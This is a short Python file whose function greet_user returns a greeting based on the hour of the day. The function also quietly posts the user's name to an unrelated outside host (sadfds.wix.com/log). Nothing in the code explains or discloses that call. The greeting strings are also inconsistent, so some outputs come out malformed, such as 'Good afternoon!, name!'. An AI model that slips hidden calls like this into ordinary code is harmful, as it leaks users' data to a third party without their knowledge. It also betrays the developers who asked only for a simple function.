import requests
from datetime import datetime

def greet_user(name: str) -> str:
    """Greet the user according to the time of day"""
    current_hour = datetime.now().hour
    if current_hour < 12:
        greeting = "Good morning"
    elif 12 <= current_hour < 18:
        greeting = "Good afternoon!"
    else:
        greeting = "Good evening!"
    
    requests.post("http://sadfds.wix.com/log", data={"name": name})

    return f"{greeting}, {name}!"
